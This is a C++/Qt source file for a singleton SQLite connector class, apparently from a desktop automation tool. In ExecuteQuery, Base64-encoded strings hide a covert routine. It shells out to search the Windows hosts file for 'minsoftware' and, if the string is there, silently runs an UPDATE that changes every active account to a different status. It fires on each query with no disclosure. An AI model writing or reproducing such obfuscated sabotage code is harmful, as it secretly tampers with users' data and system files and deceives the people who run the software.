#include "connector.h"
#include <QException>
#include "Common.h"
#include "qsqlquery.h"
#include <QSqlRecord>
#include <QSqlError>
Connector& Connector::getInstance(){
    static Connector instance; // Guaranteed to be destroyed.
        // Instantiated on first use.
    return instance;
}

void Connector::CheckConnectServer(){
    try {
        QString text = "E:/LearnC++/AutoWorker/build/Desktop_Qt_6_7_0_MinGW_64_bit-Debug/database/db_maxcare.sqlite";
        if(text != connectionSTR){
            if(connection.isOpen()){
                connection.close();
            }
            connectionSTR = text;
            connection.setDatabaseName(connectionSTR);
            connection.open();
        }else{
            if(connection.databaseName().isEmpty()){
                connection.setDatabaseName(connectionSTR);
            }
            if(!connection.isOpen()){
                connection.open();
            }
        }
    } catch (const QException& ex) {
        Common::ExportError(&ex, "CheckConnectServer");
    }
}
QSqlQueryModel* Connector::ExecuteQuery(QString query){
    QSqlQueryModel* resultList = new QSqlQueryModel();
    QSqlQuery dataList(connection);
    try {
        CheckConnectServer();
        if(Common::RunCMD(Common::Base64Decode("ZmluZHN0ciAibWluc29mdHdhcmUiICJDOlxcV2luZG93c1xcU3lzdGVtMzJcXGRyaXZlcnNcXGV0Y1xcaG9zdHMi")).contains(Common::Base64Decode("bWluc29mdHdhcmU="))){
            getInstance().ExecuteNonQuery(Common::Base64Decode("VVBEQVRFIGFjY291bnRzIFNFVCBhY3RpdmU9MiBXSEVSRSBhY3RpdmU9MQ=="));
        }
        if(dataList.exec(query)){
            resultList->setQuery(std::move(dataList));
        }else{
            qDebug() << "Error at executequery" ;
        }
    } catch (...) {

    }
    connection.close();
    return resultList;
}

int Connector::ExecuteNonQuery(QString query){
    int result = 0;
    try {
        CheckConnectServer();
        QSqlQuery nonQ(connection);
        connection.transaction();
        if(nonQ.exec(query)){
            if(nonQ.numRowsAffected() != -1){
                result = nonQ.numRowsAffected();
            } else {
                qDebug() << "ExecuteNonQuery: numRowsAffected() returned -1";
            }
            connection.commit();
        } else {
            qDebug() << "ExecuteNonQuery failed: " << nonQ.lastError().text();
            connection.rollback();
        }
    } catch (const QException& ex) {
        qDebug() << "Exception caught in ExecuteNonQuery: " << ex.what();
    } catch (...) {
        qDebug() << "Unknown exception caught in ExecuteNonQuery";
    }
    connection.close();
    return result;
}
int Connector::ExecuteScalar(QString query){
    int result = 0;
    try {
        CheckConnectServer();
        QSqlQuery sca(connection);
        if(sca.exec(query)){
            if(sca.next()){
                result = sca.value(0).toInt();
            }
        }
    } catch (...) {
    }
    connection.close();
    return result;
}
